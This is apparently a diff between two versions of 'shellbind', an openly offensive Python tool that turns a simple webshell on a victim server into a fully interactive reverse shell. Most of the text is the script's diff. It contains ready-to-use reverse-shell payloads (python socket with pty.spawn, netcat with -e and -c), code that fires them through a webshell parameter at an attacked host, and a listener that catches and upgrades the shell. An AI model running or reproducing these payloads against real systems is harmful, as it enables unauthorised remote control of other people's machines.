# Comparing `tmp/shellbind-1.0.1.tar.gz` & `tmp/shellbind-1.2.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "shellbind-1.0.1.tar", last modified: Tue Jul  4 19:08:44 2023, max compression
+gzip compressed data, was "shellbind-1.2.0.tar", last modified: Tue Jul  4 19:48:13 2023, max compression
```

## Comparing `shellbind-1.0.1.tar` & `shellbind-1.2.0.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 sol       (1000) sol       (1000)        0 2023-07-04 19:08:44.701949 shellbind-1.0.1/
--rw-r--r--   0 sol       (1000) sol       (1000)    35149 2023-06-18 20:10:21.000000 shellbind-1.0.1/LICENSE
--rw-r--r--   0 sol       (1000) sol       (1000)     2301 2023-07-04 19:08:44.701949 shellbind-1.0.1/PKG-INFO
--rw-r--r--   0 sol       (1000) sol       (1000)     2062 2023-06-18 21:57:20.000000 shellbind-1.0.1/README.md
--rw-r--r--   0 sol       (1000) sol       (1000)       38 2023-07-04 19:08:44.701949 shellbind-1.0.1/setup.cfg
--rw-r--r--   0 sol       (1000) sol       (1000)      506 2023-07-04 19:05:41.000000 shellbind-1.0.1/setup.py
-drwxr-xr-x   0 sol       (1000) sol       (1000)        0 2023-07-04 19:08:44.701949 shellbind-1.0.1/shellbind.egg-info/
--rw-r--r--   0 sol       (1000) sol       (1000)     2301 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/PKG-INFO
--rw-r--r--   0 sol       (1000) sol       (1000)      203 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/SOURCES.txt
--rw-r--r--   0 sol       (1000) sol       (1000)        1 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/dependency_links.txt
--rw-r--r--   0 sol       (1000) sol       (1000)       30 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/requires.txt
--rw-r--r--   0 sol       (1000) sol       (1000)       10 2023-07-04 19:08:44.000000 shellbind-1.0.1/shellbind.egg-info/top_level.txt
--rwxr-xr-x   0 sol       (1000) sol       (1000)     6880 2023-07-04 19:03:21.000000 shellbind-1.0.1/shellbind.py
+drwxr-xr-x   0 sol       (1000) sol       (1000)        0 2023-07-04 19:48:13.720515 shellbind-1.2.0/
+-rw-r--r--   0 sol       (1000) sol       (1000)    35149 2023-06-18 20:10:21.000000 shellbind-1.2.0/LICENSE
+-rw-r--r--   0 sol       (1000) sol       (1000)     2301 2023-07-04 19:48:13.720515 shellbind-1.2.0/PKG-INFO
+-rw-r--r--   0 sol       (1000) sol       (1000)     2062 2023-06-18 21:57:20.000000 shellbind-1.2.0/README.md
+-rw-r--r--   0 sol       (1000) sol       (1000)       38 2023-07-04 19:48:13.720515 shellbind-1.2.0/setup.cfg
+-rw-r--r--   0 sol       (1000) sol       (1000)      506 2023-07-04 19:46:38.000000 shellbind-1.2.0/setup.py
+drwxr-xr-x   0 sol       (1000) sol       (1000)        0 2023-07-04 19:48:13.720515 shellbind-1.2.0/shellbind.egg-info/
+-rw-r--r--   0 sol       (1000) sol       (1000)     2301 2023-07-04 19:48:13.000000 shellbind-1.2.0/shellbind.egg-info/PKG-INFO
+-rw-r--r--   0 sol       (1000) sol       (1000)      203 2023-07-04 19:48:13.000000 shellbind-1.2.0/shellbind.egg-info/SOURCES.txt
+-rw-r--r--   0 sol       (1000) sol       (1000)        1 2023-07-04 19:48:13.000000 shellbind-1.2.0/shellbind.egg-info/dependency_links.txt
+-rw-r--r--   0 sol       (1000) sol       (1000)       30 2023-07-04 19:48:13.000000 shellbind-1.2.0/shellbind.egg-info/requires.txt
+-rw-r--r--   0 sol       (1000) sol       (1000)       10 2023-07-04 19:48:13.000000 shellbind-1.2.0/shellbind.egg-info/top_level.txt
+-rwxr-xr-x   0 sol       (1000) sol       (1000)     7273 2023-07-04 19:45:22.000000 shellbind-1.2.0/shellbind.py
```

### Comparing `shellbind-1.0.1/LICENSE` & `shellbind-1.2.0/LICENSE`

 * *Files identical despite different names*

### Comparing `shellbind-1.0.1/PKG-INFO` & `shellbind-1.2.0/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: shellbind
-Version: 1.0.1
+Version: 1.2.0
 Summary: Shellbinding to Webshell
 Home-page: https://github.com/hydr0nium/shellbind
 Author: Hydr0nium/Sol
 License: GPL-3.0
 Description-Content-Type: text/markdown
 License-File: LICENSE
```

### Comparing `shellbind-1.0.1/README.md` & `shellbind-1.2.0/README.md`

 * *Files identical despite different names*

### Comparing `shellbind-1.0.1/shellbind.egg-info/PKG-INFO` & `shellbind-1.2.0/shellbind.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: shellbind
-Version: 1.0.1
+Version: 1.2.0
 Summary: Shellbinding to Webshell
 Home-page: https://github.com/hydr0nium/shellbind
 Author: Hydr0nium/Sol
 License: GPL-3.0
 Description-Content-Type: text/markdown
 License-File: LICENSE
```

### Comparing `shellbind-1.0.1/shellbind.py` & `shellbind-1.2.0/shellbind.py`

 * *Files 7% similar despite different names*

```diff
@@ -9,29 +9,31 @@
 import time
 import os
 import multiprocessing
 
 # Parse Command Line Arguments
 parser = argparse.ArgumentParser(description="Shellbind is a programm that helps to upgrade a simple GET/POST webshell into a semi- or fully-interactive (reverse) shell.", epilog="Examples:\n-Semi interactive shell (no cd, su, etc.)\n\tshellbind.py -X POST -p cmd -u http://vuln.example/shell.php\n-Fully interactive shell with verbose output\n\tshellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080", formatter_class=argparse.RawTextHelpFormatter)
 
-parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True, nargs=1)
-parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default=["GET"], nargs=1)
-parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked.\nExample: http://www.victim.com/vuln.php", required=True, nargs=1)
+parser.add_argument("-p", "--parameter", metavar="PARAMETER NAME", dest="para_name", help="The parameter the is used to run shell commands", required=True)
+parser.add_argument("-X" , "--method", metavar="METHOD", dest="method", help="The method (GET/POST) that that is used (Default: GET)", default="GET")
+parser.add_argument("-u", "--host", dest="host", metavar="HOST", help="The host that is attacked.\nExample: http://www.victim.com/vuln.php", required=True)
 parser.add_argument("-v", "--verbose", dest="debug", help="Verbose Output", action='store_true', default=False)
-parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT", nargs=1)
+parser.add_argument("-r", "--reverse", dest="reverse", help="If set the programm upgrades the connection from a webshell to a fully-interactive reverse shell.\nAvailable methods are:\n  auto - Try until a reverse shell binds\n  php - php reverseshell\n  py - python3 reverse shell with sockets\n  py2 - python2 reverse shell with sockets\n  nc1 - netcat reverse shell with -e flag\n  nc2 - netcat reverse shell with -c flag\n  bash - sh -i reverse shell\n  perl - perl reverse shell\nLHOST should be the ip that the victim can connect to\nThe port can be any unused port", metavar="METHOD:LHOST:PORT")
+parser.add_argument("--prefix", dest="prefix", help="Set a prefix that is send before every command in case of semi-interactive or once for the reverse shell if fully-interactive", default="")
+parser.add_argument("--postfix", dest="postfix", help="Set a postfix that is send after every command in case of semi-interactive or once for the reverse shell if fully-interactive", default="") 
 args = parser.parse_args()
 
 # Initilized listener and start trying reverse shell payloads
 def init_upgraded_shell():
-    args.method[0] = args.method[0].upper()
-    if args.method[0] not in ["GET", "POST"]:
+    args.method = args.method.upper()
+    if args.method not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     try:
-        payload_method, ip, port = args.reverse[0].split(":")
+        payload_method, ip, port = args.reverse.split(":")
         port = int(port)
         # Payloads from revshells.com
         payloads = {
                 "py": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""",
                 "py2": f"""python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""",
                 "nc1": f"""nc {ip} {port} -e sh""",
                 "nc2": f"""nc -c sh {ip} {port}""",
@@ -55,34 +57,34 @@
     time.sleep(1)
     timeout = 1
     if payload_method == 'auto':
         for payload in payloads.values():
             try:
                 if args.debug:
                     print(f"[!] Trying: {payload}") 
-                if args.method[0] == "GET":
-                    params = {args.para_name[0]: payload}
-                    requests.get(args.host[0], params=params, timeout=timeout)
-                elif args.method[0] == "POST":
-                    params = {args.para_name[0]: payload}
-                    requests.post(args.host[0], data=params, timeout=timeout)
+                if args.method == "GET":
+                    params = {args.para_name: args.prefix + payload + args.postfix}
+                    requests.get(args.host, params=params, timeout=timeout)
+                elif args.method == "POST":
+                    params = {args.para_name: args.prefix + payload + args.postfix}
+                    requests.post(args.host, data=params, timeout=timeout)
                 time.sleep(1)
             except:
                 pass
     else:
         payload = payloads[payload_method]
         try:
             if args.debug:
                 print(f"[!] Trying: {payload}") 
-            if args.method[0] == "GET":
-                params = {args.para_name[0]: payload}
-                requests.get(args.host[0], params=params, timeout=timeout)
-            elif args.method[0] == "POST":
-                params = {args.para_name[0]: payload}
-                requests.post(args.host[0], data=params, timeout=timeout)
+            if args.method == "GET":
+                params = {args.para_name: payload}
+                requests.get(args.host, params=params, timeout=timeout)
+            elif args.method == "POST":
+                params = {args.para_name: payload}
+                requests.post(args.host, data=params, timeout=timeout)
             time.sleep(1)
         except:
             pass
         print(f"[!] Method {payload_method} was not successfull")
 
 
 # Listens on given port and catches reverse shell. Then proceeds to upgrade it.
@@ -103,32 +105,33 @@
     nc.send('''python3 -c "import pty;pty.spawn('/bin/bash')"\n''')
     time.sleep(1)
     nc.send("reset\n")
     nc.interactive()
     
 
 def web_shell():
-    args.method[0] = args.method[0].upper()
-    if args.method[0] not in ["GET", "POST"]:
+    args.method = args.method.upper()
+    if args.method not in ["GET", "POST"]:
         print(f"[!] Method {args.method} not recognized")
         sys.exit()
     if args.debug:
         print("[!] Shellbind is ready. You can run commands now")
     while True:
         try:
             command = input("$ ")
-            if args.method[0] == "GET":
-                params = {args.para_name[0]: command}
-                res = requests.get(args.host[0], params=params)
+            command = args.prefix + command + args.postfix
+            if args.method == "GET":
+                params = {args.para_name: command}
+                res = requests.get(args.host, params=params)
             else:
-                params = {args.para_name[0]: command}
-                res = requests.post(args.host[0], data=params)
+                params = {args.para_name: command}
+                res = requests.post(args.host, data=params)
             print(res.text)
         except requests.ConnectionError:
-            host = args.host[0].replace("\n", "")
+            host = args.host.replace("\n", "")
             print(f"[!] Connection to {host} not possible")
             sys.exit()
         except KeyboardInterrupt:
             if args.debug:
                 print("[!] Exiting Connection to webshell")
             sys.exit()
```

